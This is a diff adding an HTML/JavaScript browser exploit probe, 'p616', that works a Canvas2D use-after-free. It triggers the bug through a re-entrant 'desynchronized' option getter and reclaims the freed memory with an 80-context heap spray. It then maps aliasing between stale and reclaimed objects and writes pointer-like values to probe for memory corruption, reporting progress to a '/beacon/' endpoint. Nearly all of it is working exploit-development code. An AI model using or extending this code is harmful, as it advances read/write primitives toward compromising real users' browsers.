@@ -1,0 +1,224 @@
+<!--
+  p616: Canvas2D UAF — struct layout + freed memory probe
+
+  p553 confirmed: desynchronized getter UAF gives bidirectional R/W via same-type
+  reclaim (80 Canvas2D spray). Transform matrix = 6 doubles (48B), plus lineWidth,
+  globalAlpha, shadowBlur, etc.
+
+  This probe maps what we can READ from the stale wrapper:
+  Phase A: Read ALL properties from stale `inner` BEFORE spray (freed memory)
+  Phase B: Read again AFTER spray (reclaimed same-type)
+  Phase C: Write specific patterns via inner, read via spray to find exact aliasing
+  Phase D: Write extreme doubles via inner, call methods on spray to detect overlap
+           with non-transform fields
+
+  Key question: does the freed/reclaimed memory expose any pointer-shaped values
+  when read as doubles?
+
+  CRASH_CLASS: MODERATE (UAF read on freed memory, might crash)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p616</title></head>
+<body>p616: Canvas2D struct probe
+<script>
+function b(m) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(m), false);
+    x.send();
+  } catch(e) {
+    try { new Image().src = '/beacon/' + encodeURIComponent('XFAIL-' + m); } catch(e2) {}
+  }
+}
+
+function dblHex(d) {
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = d;
+  var u = new Uint8Array(buf);
+  var s = '';
+  for (var i = 7; i >= 0; i--) s += ('0' + u[i].toString(16)).slice(-2);
+  return s;
+}
+
+function readAllProps(ctx, tag) {
+  try {
+    var t = ctx.getTransform();
+    b(tag + '-Ta=' + dblHex(t.a) + '-Tb=' + dblHex(t.b));
+    b(tag + '-Tc=' + dblHex(t.c) + '-Td=' + dblHex(t.d));
+    b(tag + '-Te=' + dblHex(t.e) + '-Tf=' + dblHex(t.f));
+  } catch(e) {
+    b(tag + '-TRANSFORM-ERR=' + e);
+  }
+  try {
+    b(tag + '-lw=' + dblHex(ctx.lineWidth) + '-ga=' + dblHex(ctx.globalAlpha));
+    b(tag + '-sb=' + dblHex(ctx.shadowBlur) + '-sox=' + dblHex(ctx.shadowOffsetX));
+    b(tag + '-soy=' + dblHex(ctx.shadowOffsetY) + '-ml=' + dblHex(ctx.miterLimit));
+    b(tag + '-ldo=' + dblHex(ctx.lineDashOffset));
+  } catch(e) {
+    b(tag + '-PROPS-ERR=' + e);
+  }
+  try {
+    b(tag + '-sc=' + ctx.shadowColor + '-fs=' + String(ctx.fillStyle).slice(0,30));
+    b(tag + '-ss=' + String(ctx.strokeStyle).slice(0,30) + '-lc=' + ctx.lineCap);
+    b(tag + '-lj=' + ctx.lineJoin + '-ta=' + ctx.textAlign + '-tb=' + ctx.textBaseline);
+    b(tag + '-font=' + String(ctx.font).slice(0,40));
+    b(tag + '-co=' + ctx.globalCompositeOperation);
+  } catch(e) {
+    b(tag + '-STR-ERR=' + e);
+  }
+}
+
+window.onerror = function(m) { b('P616-ONERR=' + String(m).slice(0,100)); };
+
+(function() {
+try {
+b('P616-START');
+
+// ===== Phase A: Trigger UAF, read BEFORE spray =====
+var canvas = document.createElement('canvas');
+canvas.width = 10; canvas.height = 10;
+document.body.appendChild(canvas);
+
+var inner = null;
+var outer = null;
+var opts = {};
+Object.defineProperty(opts, 'desynchronized', { get: function() {
+  if (!inner) inner = canvas.getContext('2d');
+  return false;
+}});
+
+outer = canvas.getContext('2d', opts);
+
+if (!inner || inner === outer) {
+  b('P616-NO-UAF');
+  return;
+}
+b('P616-UAF-OK');
+
+// Phase A SKIPPED: reading freed memory crashes (vtable is garbage)
+// Go straight to spray
+b('P616-PHASE-B-SPRAY');
+var sprays = [];
+for (var i = 0; i < 80; i++) {
+  var sc = document.createElement('canvas');
+  sc.width = 10; sc.height = 10;
+  sprays.push(sc.getContext('2d'));
+}
+
+// Read from inner after spray — should see default values from reclaimed context
+readAllProps(inner, 'B');
+
+// ===== Phase C: Find the alias =====
+b('P616-PHASE-C-ALIAS');
+// Write recognizable pattern via inner
+inner.setTransform(1.5, 2.5, 3.5, 4.5, 5.5, 6.5);
+
+var aliasIdx = -1;
+for (var i = 0; i < sprays.length; i++) {
+  var st = sprays[i].getTransform();
+  if (st.a === 1.5 && st.b === 2.5 && st.e === 5.5) {
+    aliasIdx = i;
+    break;
+  }
+}
+b('P616-ALIAS=' + aliasIdx);
+
+if (aliasIdx < 0) {
+  b('P616-NO-ALIAS');
+  return;
+}
+
+var alias = sprays[aliasIdx];
+
+// Write via inner, read ALL properties on alias
+inner.setTransform(11.11, 22.22, 33.33, 44.44, 55.55, 66.66);
+inner.lineWidth = 77.77;
+inner.globalAlpha = 0.88;
+inner.shadowBlur = 99.99;
+inner.shadowOffsetX = 111.11;
+inner.shadowOffsetY = 222.22;
+inner.miterLimit = 333.33;
+inner.lineDashOffset = 444.44;
+
+b('P616-C-INNER-WRITE-DONE');
+readAllProps(alias, 'C-ALIAS');
+
+// Reverse: write via alias, read via inner
+alias.setTransform(0.001, 0.002, 0.003, 0.004, 0.005, 0.006);
+alias.lineWidth = 0.007;
+alias.globalAlpha = 0.008;
+readAllProps(inner, 'C-INNER');
+
+// ===== Phase D: Probe for pointer-adjacent fields =====
+// Write doubles that look like pointer values, check if methods crash
+b('P616-PHASE-D-PTRPROBE');
+
+// Create a new double that encodes a recognizable pointer-like pattern
+// 0x4141414141414141 as double = 2.2428828856361393e+6 (approx)
+var ptrBuf = new ArrayBuffer(8);
+var ptrView = new DataView(ptrBuf);
+ptrView.setUint32(0, 0x41414141, false);
+ptrView.setUint32(4, 0x41414141, false);
+var ptrDouble = new Float64Array(ptrBuf)[0];
+b('P616-D-PTRDBL=' + dblHex(ptrDouble));
+
+// Write pointer-like doubles to ALL transform slots
+try {
+  inner.setTransform(ptrDouble, ptrDouble, ptrDouble, ptrDouble, ptrDouble, ptrDouble);
+  b('P616-D-SETTX-OK');
+} catch(e) {
+  b('P616-D-SETTX-ERR=' + e);
+}
+
+// Now try reading various things from alias to see if anything broke
+try {
+  var at = alias.getTransform();
+  b('P616-D-READ-OK-a=' + dblHex(at.a));
+} catch(e) {
+  b('P616-D-READ-ERR=' + e);
+}
+
+// Try drawing operations that might follow pointers
+try {
+  alias.fillRect(0, 0, 1, 1);
+  b('P616-D-FILL-OK');
+} catch(e) {
+  b('P616-D-FILL-ERR=' + e);
+}
+
+try {
+  alias.strokeRect(0, 0, 1, 1);
+  b('P616-D-STROKE-OK');
+} catch(e) {
+  b('P616-D-STROKE-ERR=' + e);
+}
+
+try {
+  var id = alias.getImageData(0, 0, 1, 1);
+  b('P616-D-IMGDATA-OK-len=' + id.data.length);
+} catch(e) {
+  b('P616-D-IMGDATA-ERR=' + e);
+}
+
+// Restore safe transform
+inner.setTransform(1, 0, 0, 1, 0, 0);
+
+// ===== Phase E: Test save/restore depth =====
+b('P616-PHASE-E-SAVE');
+for (var i = 0; i < 20; i++) {
+  inner.save();
+  inner.setTransform(i+0.1, i+0.2, i+0.3, i+0.4, i+0.5, i+0.6);
+}
+// Read deepest state via alias
+var deep = alias.getTransform();
+b('P616-E-DEEP-a=' + dblHex(deep.a) + '-d=' + dblHex(deep.d));
+
+// Restore all and check
+for (var i = 0; i < 20; i++) inner.restore();
+var restored = alias.getTransform();
+b('P616-E-RESTORED-a=' + dblHex(restored.a));
+
+b('P616-ALIVE');
+} catch(fatal) { b('P616-FATAL=' + String(fatal).slice(0,200)); }
+})();
+</script>
+</body></html>
